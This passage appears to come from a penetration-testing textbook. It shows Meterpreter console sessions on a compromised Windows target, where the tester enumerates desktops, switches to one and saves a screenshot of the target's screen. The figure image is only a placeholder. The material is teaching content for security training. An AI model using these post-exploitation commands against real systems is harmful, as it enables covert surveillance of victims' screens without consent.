```
meterpreter > enumdesktops
Enumerating all accessible desktops

Desktops
========

Session Station Name
-------- -------- ----
1 WinSta0 Default

meterpreter > getdesktop 1
Session 1\W\D
meterpreter > 
```

# FIGURE 14-6 Working with Desktops.

One of the fascinating things you can do with a desktop is to take a snapshot. As demonstrated in Figure 14-7, just type the following command:

```
screenshot
```

```
meterpreter > getdesktop 1
Session 1\W\D
meterpreter > screenshot
Screenshot saved to: /root/vAdCfQYx.jpeg
meterpreter > 
```

# FIGURE 14-7 screenshot.

Figure 14-8 is the actual screenshot from the target desktop.

![](bbox=[0.07, 0.55, 0.61, 0.86])

# FIGURE 14-8 The Actual Screenshot.